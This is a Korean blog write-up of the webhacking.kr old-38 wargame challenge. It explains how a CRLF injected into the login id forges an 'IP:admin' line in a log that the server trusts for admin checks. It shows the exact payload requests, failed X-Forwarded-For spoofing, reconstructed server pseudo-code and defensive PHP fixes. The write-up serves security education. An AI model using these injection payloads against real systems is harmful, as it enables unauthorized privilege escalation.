---
title: "webhacking.kr old-38 풀이 — 개행 한 줄로 로그를 위조하는 Log Injection, 그리고 CRLF의 함정"
description: "webhacking.kr old-38을 통해, 로그인 로그에 개행을 집어넣어 'IP:admin' 한 줄을 위조하고 admin 권한 판정을 통과하는 Log Injection을 정리한다. id가 trim·strtolower·htmlspecialchars로 걸러지는 모습과, 직접 admin 로그인·IP 헤더 위조가 왜 막히는지, 그리고 LF(개행)만으로는 풀리지 않고 CRLF(\\r\\n)로 바꿔야 통과하는 결정적 차이를 실제 요청·응답으로만 검증해 설명한다."
date: 2026-11-18
category: Web
tags: [webhacking.kr, web, wargame, log-injection, crlf-injection, access-control, php]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 정리했다. 본문의 공인 IP는 본인 IP를 문서용 예시값(`203.0.113.45`, RFC 5737)으로 익명화해 표기한다. `127.0.0.1`은 로컬호스트라 그대로 둔다.

[webhacking.kr](https://webhacking.kr)의 old-38 문제를 풀었다. old-21이 "응답 문구 차이로 비밀번호를 빼내는 Blind SQL Injection", old-05가 "클라이언트로만 막은 인증과 문자열 정규화 불일치"였다면, old-38은 "서버가 신뢰해 버린 로그에 공격자가 가짜 줄을 끼워 넣는 Log Injection"이 주제다.

직접 `admin`으로 로그인하려 하면 서버가 "you are not admin"으로 막는다. 그런데 로그인할 때마다 기록되는 로그에는 내 입력이 그대로 들어간다. 그 입력에 개행을 집어넣어 로그에 `IP:admin`이라는 가짜 한 줄을 위조하면, 로그를 읽어 권한을 판정하는 쪽이 나를 admin으로 인정한다. 특히 LF(`\n`)만으로는 끝내 풀리지 않고, CRLF(`\r\n`)로 바꾸자 통과하는 결정적 차이를, 같은 형태의 페이로드를 개행만 바꿔 가며 직접 확인했다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-38 (`/challenge/bonus-9/`) |
| 배점 | 10점 |
| 유형 | Log Injection / 접근 제어 우회 (CRLF 개행 주입) |
| 목표 | 로그를 위조해 `admin`으로 인정받아 통과 |

화면 구성은 단순하다. `index.php`에는 id 입력창 하나와 Login 버튼, 그리고 HTML 주석에 숨은 admin 페이지 링크가 있다.

```html
<h1>LOG INJECTION</h1>
<form method=post action=index.php>
<input type=text name=id size=20>
<input type=submit value='Login'>
</form>
<!-- <a href=admin.php>admin page</a> -->
```

`admin.php`는 "log viewer"로, 지금까지 로그인된 기록을 보여 주면서 맨 위에 한 줄을 띄운다.

```html
<h1>log viewer</h1>
<p>You must logged as "admin"</p>
...IP:id<br> 형태의 로그 목록...
```

즉 id를 로그인하면 `index.php`가 `내IP:입력한id`를 로그에 한 줄 적고, `admin.php`는 그 로그를 읽어 "너는 admin으로 로그인했는가"를 판정한다.

## 2. 관찰 — index.php가 입력을 어떻게 기록하는가

먼저 평범한 값을 로그인해 로그 형식을 확인했다. 아래는 전부 실제 응답이다(IP는 익명화).

| 로그인한 `id` | `admin.php`의 로그 줄 |
| --- | --- |
| `guest` | `203.0.113.45:guest<br>` |
| `clz<b>hi` | `203.0.113.45:clz&lt;b&gt;hi<br>` |
| `MARK832564` | `203.0.113.45:mark832564<br>` |

세 가지가 드러난다. 형식은 `내IP:입력값<br>` 한 줄이고, IP(`REMOTE_ADDR`)는 줄 맨 앞에 서버가 한 번 붙이고 그 뒤에 내 입력, 끝에 `<br>`가 붙는다. `<`, `>`는 `htmlspecialchars`로 이스케이프된다(`clz<b>hi` → `clz&lt;b&gt;hi`). 로그에 진짜 `<br>` 태그나 HTML을 넣어 줄(엔트리)을 쪼개는 건 불가능하다. `id`는 소문자화된다(`MARK832564` → `mark832564`). `strtolower()`가 걸려 있다. 여기에 앞뒤 공백·개행은 잘린다(`trim`)는 것도 확인했다. `id` 앞이나 뒤에 개행만 붙이면 그 개행은 사라졌다. 하지만 입력 중간에 낀 개행은 그대로 남는다. 이게 이 문제의 지렛대가 된다.

## 3. 정공법이 막히는 지점 — 직접 admin, 그리고 IP 헤더 위조

로그를 건드리기 전에, 그냥 `admin`으로 로그인하면 어떻게 되는지부터 봤다.

```text
POST /challenge/bonus-9/index.php    id=admin
→ "you are not admin"
```

`id=admin`(대문자 `ADMIN`도 `strtolower` 때문에 동일)은 "you are not admin"으로 거부되고, 로그에도 남지 않는다. 즉 서버는 `admin`이라는 id를 특별 취급해, 진짜 admin인지(= `REMOTE_ADDR`이 admin의 것인지)를 따로 검사한다. 그렇다면 "내 IP를 admin의 IP로 속이면?" 싶어 흔한 IP 위장 헤더를 전부 넣어 봤다. 결과는 전부 그대로 "you are not admin"이었다.

| 요청 | 결과 |
| --- | --- |
| `id=admin` + `X-Forwarded-For: 127.0.0.1` | `you are not admin` |
| `id=admin` + `Client-IP: 127.0.0.1` | `you are not admin` |
| `id=admin` + `X-Real-IP: 127.0.0.1` | `you are not admin` |

로그를 적을 때도 이 헤더들은 무시됐다. `X-Forwarded-For: 9.9.9.9`를 보내도 로그엔 여전히 `203.0.113.45:...`로 진짜 `REMOTE_ADDR`이 찍혔다. 즉 IP는 클라이언트가 조작할 수 없는 값이고, 정공법(직접 admin 로그인)은 닫혀 있다. 남은 통로는 로그 그 자체다.

## 4. 아이디어 — 개행으로 로그에 가짜 줄 심기

핵심은 2절에서 본 두 사실이다. 로그는 `내IP:입력값` 꼴로 IP는 내 입력의 맨 앞에만 한 번 붙고, 입력 중간의 개행은 그대로 로그에 남는다. 그러면 입력값 안에 개행 + `내IP:admin`을 끼워 넣으면, 로그는 이렇게 두 줄로 갈라진다.

```text
203.0.113.45:앞부분
203.0.113.45:admin        ← 개행 뒤는 내가 100% 통제 → IP까지 내가 적는다
```

`admin.php`가 로그를 읽어 "`내IP:admin` 줄이 있으면 admin으로 인정"한다면, 이 가짜 줄로 통과할 수 있다. 바로 이것이 Log Injection이다. 문제는 입력 칸이 `<input type=text>`라 브라우저 폼으로는 개행을 못 넣는다는 점이다. 그래서 요청을 직접 만들어(또는 입력창을 `textarea`로 바꿔) 개행을 넣어야 한다. 아래는 문제 페이지 콘텍스트에서 `fetch`로 보낸 실제 요청들이다.

## 5. LF로는 안 된다 — 결정적 함정

처음엔 개행을 LF(`\n`, URL 인코딩 `%0A`)로 넣었다. 여러 형태를 시도하며, 그때마다 `admin.php`를 다시 읽고 `chall.php`의 풀이 표시(`✔️`)를 확인했다.

| 주입한 입력 (`\n` = LF) | 로그에 생긴 줄 | 통과? |
| --- | --- | --- |
| `hack\n203.0.113.45:admin` | `203.0.113.45:admin<br>` (깨끗) | ❌ |
| `a\nadmin\n.` | `admin` (IP 없는 순수 줄) | ❌ |
| `x\n127.0.0.1:admin\n.` | `127.0.0.1:admin` (깨끗) | ❌ |

분명히 로그에는 `203.0.113.45:admin`도, 순수한 `admin`도, `127.0.0.1:admin`도 깨끗한 한 줄로 존재했다. 그런데 `admin.php`의 문구는 계속 `You must logged as "admin"`이었고, `chall.php`에서도 풀리지 않았다.

여기서 막혔다가, 브라우저가 `textarea`를 전송할 때 개행을 `\n`이 아니라 CRLF(`\r\n`)로 보낸다는 점을 떠올렸다. 서버가 로그를 CRLF(`\r\n`) 기준으로 줄을 나눠 읽는다면, LF만 넣은 내 줄들은 서버 입장에서 줄이 나뉘지 않은 것이다. 앞줄에 그대로 붙어 `203.0.113.45:hack...203.0.113.45:admin` 한 덩어리로 보이니, `IP:admin`과 정확히 일치하지 않는다. 그래서 개행만 CRLF로 바꿔 똑같이 보냈다.

```text
POST /challenge/bonus-9/index.php
id=123%0D%0A203.0.113.45:admin        (%0D%0A = CRLF = \r\n)
```

이 요청으로 로그에는 `\r\n`으로 분리된 `203.0.113.45:admin` 줄이 생겼고, 이어서 `admin.php`를 열자 통과했다.

> 같은 형태의 페이로드를 개행 문자만 `\n` → `\r\n`으로 바꾼 것이 유일한 차이였다. LF로는 전부 실패, CRLF로는 첫 시도에 통과. 즉 서버의 로그 파싱은 CRLF 기준이었다.

## 6. 관찰로 복원한 서버 로직

webhacking.kr은 이 문제의 서버 소스를 공개하지 않는다(`.phps`는 403). 아래는 지금까지의 관찰로부터 복원한 의사 코드다.

```php
<?php
// --- index.php (로그인 + 기록) ---
$ip = $_SERVER['REMOTE_ADDR'];                 // 헤더로 못 바꾼다 (XFF 등 무시)
$id = strtolower(trim($_POST['id']));          // 소문자화 + 앞뒤 공백/개행 제거
if ($id === 'admin') {
  // 진짜 admin(서버가 아는 IP)인지 따로 검사 → 원격 사용자는 탈락
  echo 'you are not admin';
} else {
  // 로그 한 줄 추가: 내 IP + 입력값(중간 개행은 그대로) + <br>
  fwrite($log, $ip . ':' . htmlspecialchars($id) . "<br>\r\n");  // 줄 끝이 CRLF
}

// --- admin.php (로그 뷰어 + 판정) ---
$ip   = $_SERVER['REMOTE_ADDR'];
$data = file_get_contents($logfile);
foreach (explode("\r\n", $data) as $line) {    // ← CRLF 로 줄을 나눈다
  if ($line === $ip . ':admin') { solve(38); } // 내 IP:admin 줄이 있으면 admin 인정
}
echo 'You must logged as "admin"';             // 성공해도 이 문구 자체는 안 바뀐다
?>
```

`strtolower`/`trim` 때문에 `id`를 직접 `admin` 비슷하게 넣어 통과하는 길은 막혀 있다. `htmlspecialchars`가 `<`,`>`를 죽이므로 진짜 `<br>`로 엔트리를 쪼갤 수 없다. 쪼갤 수 있는 건 오직 개행뿐이다. 그리고 그 개행은 `\r\n`(CRLF)이어야 `admin.php`의 `explode("\r\n", ...)`가 내 가짜 줄을 독립된 한 줄로 인식한다. LF만으로는 앞줄에 붙어 버려 `$ip:admin`과 일치하지 않는다. 5절에서 본 그대로다.

## 7. 결과

CRLF로 `203.0.113.45:admin` 줄을 심은 뒤 `admin.php`를 열자, `chall.php`에서 `✔️ old-38`로 풀린 것이 확인됐다.

```text
POST /challenge/bonus-9/index.php   id=123\r\n203.0.113.45:admin
GET  /challenge/bonus-9/admin.php
→ chall.php:  ✔️ old-38      (점수 획득)
```

한 가지 특이점은 `admin.php`의 화면 문구가 성공 뒤에도 `You must logged as "admin"` 그대로라는 것이다. old-21·old-05처럼 `Pwned. You got Npoint` 같은 축하 문구를 띄우지 않고 점수만 조용히 올린다. 그래서 성공 판정은 화면 문구가 아니라 `chall.php`의 `✔️`와 점수 상승으로 확인했다.

## 8. 왜 취약한가 — 그리고 올바른 방어

첫째, 로그는 "신뢰된 사실"이 아니라 "사용자 입력이 섞인 데이터"다. 이 문제의 본질은 사용자 입력을 그대로 로그에 적고, 그 로그를 다시 읽어 권한을 판정한 데 있다. 공격자가 입력에 개행을 넣는 순간 로그 한 줄을 통째로 위조할 수 있으니, 로그로 인증·인가를 결정하면 안 된다. 권한은 세션/서버가 쥔 신뢰값(로그인된 사용자 레코드)으로만 판단해야 한다.

둘째, 개행(CR/LF)을 입력 경계로 흘려보내지 않는다(Log/CRLF Injection 방어). 로그·헤더·파일 등 "줄" 단위로 해석되는 곳에 사용자 입력을 넣을 때는 반드시 개행을 무력화한다. `\r`, `\n`을 제거하거나 이스케이프하고, 길이·화이트리스트로 제한한다.

```php
// 로그에 사용자 값을 남길 때: 개행 제거(또는 이스케이프)로 "한 줄 = 한 기록" 불변식을 지킨다
$safe = str_replace(["\r", "\n"], ' ', $id);        // 또는 rawurlencode($id)
$safe = substr($safe, 0, 64);                        // 길이 제한
error_log($ip . ' ' . $safe);                        // 구조화 로깅이면 더 안전
```

셋째, 인가는 로그가 아니라 서버 신뢰 상태로 한다. "이 IP가 admin으로 로그인한 적 있나"를 로그 문자열 매칭으로 판단하는 구조 자체가 위험하다. 로그인에 성공한 세션에 역할을 저장하고, admin 판정은 그 세션 역할로만 한다.

```php
// 로그인 성공 시 서버가 신뢰하는 곳(세션)에 역할을 박아 둔다
$_SESSION['role'] = $user['role'];
// admin.php: 로그를 뒤지지 말고 세션만 본다
if (($_SESSION['role'] ?? '') !== 'admin') { http_response_code(403); exit; }
```

## 9. 정리

- old-38은 로그인 기록(`내IP:입력값`)에 개행을 끼워 넣어 `IP:admin` 가짜 줄을 심는 Log Injection이다.
- `id`는 `trim`·`strtolower`·`htmlspecialchars`로 걸러져 직접 `admin` 로그인도, `<br>`로 엔트리 쪼개기도 불가능하다. IP 위장 헤더(XFF 등)도 전부 무시된다. 통로는 중간 개행뿐이다.
- 결정적 함정은 개행의 종류였다. LF(`\n`)로 만든 깨끗한 `IP:admin`·순수 `admin`·`127.0.0.1:admin` 줄은 모두 실패, CRLF(`\r\n`)로 바꾸자 통과했다. 서버가 로그를 `\r\n` 기준으로 나눠 읽기 때문이다.
- 성공해도 `admin.php` 문구는 그대로이고, 판정은 `chall.php`의 `✔️ old-38`로 확인했다.
- 방어는 로그로 인가 판단 금지, 개행(CR/LF) 중화, 세션 기반 역할 인가다.

서버는 자기가 적은 로그를 "사실"이라 믿었다. 그러나 그 로그의 절반은 사용자가 쓴 글자였고, 개행 한 번(그것도 `\r\n`이라는 정확한 개행)이면 "admin이 로그인했다"는 거짓 한 줄이 사실인 척 끼어든다.
